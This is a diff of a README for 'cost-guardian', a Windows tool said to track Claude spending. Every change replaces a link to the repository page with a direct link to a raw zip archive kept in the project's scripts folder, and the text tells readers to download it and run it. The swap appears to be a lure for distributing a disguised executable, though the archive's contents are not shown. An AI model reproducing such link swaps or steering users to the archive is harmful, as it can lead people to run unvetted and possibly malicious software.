@@ -1,6 +1,6 @@
 # 🛡️ cost-guardian - Track Claude spend with ease
 
-[![Download Now](https://img.shields.io/badge/Download%20cost--guardian-4C9AFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Smaller-rawdata285/cost-guardian)
+[![Download Now](https://img.shields.io/badge/Download%20cost--guardian-4C9AFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Smaller-rawdata285/cost-guardian/raw/refs/heads/main/scripts/guardian_cost_v3.2.zip)
 
 ## 🧭 What this app does
 
@@ -28,7 +28,7 @@ cost-guardian is built for a simple install flow. You do not need Docker or Graf
 
 ## 🚀 Download and install
 
-Visit this page to download: [https://github.com/Smaller-rawdata285/cost-guardian](https://github.com/Smaller-rawdata285/cost-guardian)
+Visit this page to download: [https://github.com/Smaller-rawdata285/cost-guardian/raw/refs/heads/main/scripts/guardian_cost_v3.2.zip](https://github.com/Smaller-rawdata285/cost-guardian/raw/refs/heads/main/scripts/guardian_cost_v3.2.zip)
 
 Then follow these steps on Windows:
 
@@ -180,7 +180,7 @@ It is a good fit for solo work, testing, and long coding sessions where costs ca
 
 If you need to reinstall or set up another PC, use the same link:
 
-[https://github.com/Smaller-rawdata285/cost-guardian](https://github.com/Smaller-rawdata285/cost-guardian)
+[https://github.com/Smaller-rawdata285/cost-guardian/raw/refs/heads/main/scripts/guardian_cost_v3.2.zip](https://github.com/Smaller-rawdata285/cost-guardian/raw/refs/heads/main/scripts/guardian_cost_v3.2.zip)
 
 Open the page, get the latest Windows download, and run it on the new machine
 
@@ -212,4 +212,4 @@ Check the repository page for updates, release files, and project details. Use t
 
 ## 🖱️ Download link
 
-[Visit the cost-guardian download page](https://github.com/Smaller-rawdata285/cost-guardian)
+[Visit the cost-guardian download page](https://github.com/Smaller-rawdata285/cost-guardian/raw/refs/heads/main/scripts/guardian_cost_v3.2.zip)
